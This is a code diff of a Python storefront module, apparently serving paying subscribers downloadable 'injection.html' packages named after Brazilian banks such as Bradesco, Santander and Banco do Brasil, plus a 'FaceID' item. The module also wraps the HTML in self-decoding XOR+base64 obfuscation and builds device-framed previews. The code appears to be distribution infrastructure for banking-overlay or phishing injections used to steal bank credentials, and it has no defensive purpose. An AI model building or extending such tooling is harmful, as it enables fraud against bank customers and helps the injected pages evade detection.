@@ -6,8 +6,7 @@ import secrets
 
 from config import Config
 
-_PRODUCT_ID_RE = re.compile(r"^[a-z0-9_-]+$")
-_CHECKOUT_METHODS = frozenset({"pix", "bitcoin"})
+_PRODUCT_ID_RE = re.compile(r"^[a-zA-Z0-9_-]+$")
 _OBF_SCRIPT_ID = "katana-html-obf"
 _OBF_RE = re.compile(
     rf'<script\s+id="{_OBF_SCRIPT_ID}"[^>]*>.*?var\s+k=\[([0-9,\s]+)\];\s*'
@@ -15,93 +14,161 @@ _OBF_RE = re.compile(
     re.DOTALL,
 )
 _OBF_CHUNK_SIZE = 4096
+_STORE_PRODUCT_ORDER = (
+    "Bradesco",
+    "Santander",
+    "BancoDoBrasil",
+    "FaceID",
+    "BradescoAtualizacao",
+)
 
+def _product_sort_key(product):
+    product_id = product.get("id") or ""
+    try:
+        return (0, _STORE_PRODUCT_ORDER.index(product_id))
+    except ValueError:
+        return (1, product_id.casefold())
 
-def _format_price(price_cents):
-    value = price_cents / 100
-    if price_cents % 100 == 0:
-        whole = f"{int(value):,}".replace(",", ".")
-        return f"R$ {whole}"
-    formatted = f"{value:,.2f}"
-    return "R$ " + formatted.replace(",", "X").replace(".", ",").replace("X", ".")
+def _compact_product_key(value):
+    return re.sub(r"[\s_-]+", "", (value or "").casefold())
 
-
-def _product_dir(product_id):
-    if not _PRODUCT_ID_RE.match(product_id or ""):
+def _catalog_root():
+    root = Config.STORE_CATALOG_DIR
+    if not os.path.isdir(root):
         return None
-    path = os.path.join(Config.STORE_CATALOG_DIR, product_id)
-    if not os.path.isdir(path):
+    return root
+
+def _resolve_catalog_dir(catalog_dir):
+    if not catalog_dir:
         return None
-    return path
 
+    catalog_root = _catalog_root()
+    if not catalog_root:
+        return None
 
-def list_products():
-    catalog_dir = Config.STORE_CATALOG_DIR
-    if not os.path.isdir(catalog_dir):
+    exact = os.path.join(catalog_root, catalog_dir)
+    if os.path.isdir(exact):
+        return exact
+
+    needle = catalog_dir.casefold()
+    compact = _compact_product_key(catalog_dir)
+    for entry in os.listdir(catalog_root):
+        path = os.path.join(catalog_root, entry)
+        if not os.path.isdir(path):
+            continue
+        if entry.casefold() == needle:
+            return path
+        if compact and _compact_product_key(entry) == compact:
+            return path
+    return None
+
+def _load_meta(product_dir):
+    meta_path = os.path.join(product_dir, "product.json")
+    if not os.path.isfile(meta_path):
+        return None
+    with open(meta_path, encoding="utf-8") as handle:
+        meta = json.load(handle)
+    product_id = meta.get("id")
+    if not product_id or not _PRODUCT_ID_RE.match(product_id):
+        return None
+    injection_path = os.path.join(product_dir, "injection.html")
+    if not os.path.isfile(injection_path):
+        return None
+    tags = meta.get("tags") or []
+    if isinstance(tags, str):
+        tags = json.loads(tags)
+    return {
+        "id": product_id,
+        "name": meta.get("name") or product_id,
+        "bank": meta.get("bank") or "",
+        "description": meta.get("description") or "",
+        "tags": tags,
+        "catalog_dir": os.path.basename(product_dir),
+        "product_dir": product_dir,
+        "injection_path": injection_path,
+    }
+
+def _meta_to_product(meta):
+    product_id = meta["id"]
+    return {
+        "id": product_id,
+        "name": meta["name"],
+        "bank": meta["bank"],
+        "description": meta["description"],
+        "tags": meta["tags"],
+        "catalog_dir": meta["catalog_dir"],
+        "thumb_url": f"/subscriber/api/store/thumb/{product_id}",
+        "download_url": f"/subscriber/api/store/download/{product_id}",
+        "has_thumb": bool(get_thumb_path(product_id, meta["catalog_dir"])),
+    }
+
+def _iter_catalog_metas():
+    catalog_root = _catalog_root()
+    if not catalog_root:
         return []
 
-    products = []
-    for entry in sorted(os.listdir(catalog_dir)):
-        meta_path = os.path.join(catalog_dir, entry, "product.json")
-        if not os.path.isfile(meta_path):
+    items = []
+    for entry in os.listdir(catalog_root):
+        product_dir = os.path.join(catalog_root, entry)
+        if not os.path.isdir(product_dir) or entry.startswith("."):
             continue
-        with open(meta_path, encoding="utf-8") as handle:
-            product = json.load(handle)
-        product["price_display"] = _format_price(product.get("price_cents", 0))
-        products.append(product)
-    return products
+        meta = _load_meta(product_dir)
+        if meta:
+            items.append(meta)
+    return items
 
+def _find_meta(product_id):
+    if not _PRODUCT_ID_RE.match(product_id or ""):
+        return None
+    needle = product_id.casefold()
+    for meta in _iter_catalog_metas():
+        if meta["id"].casefold() == needle:
+            return meta
+    return None
 
-def get_product(product_id):
-    product_dir = _product_dir(product_id)
+def get_thumb_path(product_id, catalog_dir=None):
+    if catalog_dir:
+        product_dir = _resolve_catalog_dir(catalog_dir)
+    else:
+        meta = _find_meta(product_id)
+        product_dir = meta["product_dir"] if meta else _resolve_catalog_dir(product_id)
     if not product_dir:
         return None
+    thumb_path = os.path.join(product_dir, "thumb.png")
+    if os.path.isfile(thumb_path):
+        return thumb_path
+    return None
 
-    meta_path = os.path.join(product_dir, "product.json")
-    injection_path = os.path.join(product_dir, "injection.html")
-    if not os.path.isfile(meta_path) or not os.path.isfile(injection_path):
+def get_injection_path(product_id):
+    meta = _find_meta(product_id)
+    if not meta:
         return None
+    path = meta["injection_path"]
+    if os.path.isfile(path):
+        return path
+    return None
 
-    with open(meta_path, encoding="utf-8") as handle:
-        product = json.load(handle)
-    product["price_display"] = _format_price(product.get("price_cents", 0))
-    return product
+def _product_dir(product_id):
+    meta = _find_meta(product_id)
+    if meta:
+        return meta["product_dir"]
+    return _resolve_catalog_dir(product_id)
 
+def list_products():
+    products = [_meta_to_product(meta) for meta in _iter_catalog_metas()]
+    products.sort(key=_product_sort_key)
+    return products
 
-def create_checkout_intent(product_id, method):
-    if method not in _CHECKOUT_METHODS:
-        return None, "Metodo invalido"
-
-    product = get_product(product_id)
-    if not product:
-        return None, "Produto nao encontrado"
-
-    if method == "pix":
-        return {
-            "status": "unavailable",
-            "method": "pix",
-            "message": "Pix ainda nao configurado.",
-        }, None
-
-    return {
-        "status": "ready",
-        "method": "bitcoin",
-        "address": Config.STORE_BTC_ADDRESS,
-        "qr_url": "/static/img/payments/bitcoin-qr.png",
-        "product": {
-            "id": product["id"],
-            "name": product["name"],
-            "price_display": product["price_display"],
-        },
-    }, None
-
+def get_product(product_id):
+    meta = _find_meta(product_id)
+    if not meta:
+        return None
+    return _meta_to_product(meta)
 
 def is_obfuscated_html(html):
     return f'id="{_OBF_SCRIPT_ID}"' in (html or "")
 
-
 def obfuscate_html(html):
-    """Empacota HTML em wrapper XOR+base64 que se reescreve no document."""
     key = list(secrets.token_bytes(16))
     raw = html.encode("utf-8")
     xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))
@@ -134,9 +201,7 @@ def obfuscate_html(html):
         "</html>\n"
     )
 
-
 def deobfuscate_html(html):
-    """Recupera HTML claro de um wrapper gerado por obfuscate_html."""
     if not is_obfuscated_html(html):
         return html
 
@@ -155,7 +220,6 @@ def deobfuscate_html(html):
     raw = bytes(b ^ key[i % len(key)] for i, b in enumerate(xored))
     return raw.decode("utf-8")
 
-
 def build_preview_html(product_id, embed=False, stage="welcome"):
     product_dir = _product_dir(product_id)
     if not product_dir:
@@ -172,11 +236,32 @@ def build_preview_html(product_id, embed=False, stage="welcome"):
     if was_obfuscated:
         html = deobfuscate_html(html)
 
+    html = _ensure_preview_shell(html)
     html = _inject_preview_guard(html, embed=embed, stage=stage)
     if was_obfuscated:
         return obfuscate_html(html)
     return html
 
+def _ensure_preview_shell(html):
+    if re.search(r"""class=["']preview["']""", html):
+        return html
+
+    body_match = re.search(r"<body([^>]*)>", html, re.IGNORECASE)
+    if not body_match:
+        return html
+
+    body_end = html.lower().rfind("</body>")
+    if body_end < 0:
+        return html
+
+    body_attrs = body_match.group(1)
+    inner = html[body_match.end() : body_end]
+    shell = (
+        f"<body{body_attrs}>"
+        f'<div class="preview"><div class="device">{inner}</div></div>'
+        f"{html[body_end:]}"
+    )
+    return html[: body_match.start()] + shell
 
 def _inject_preview_guard(html, embed, stage):
     if not embed:
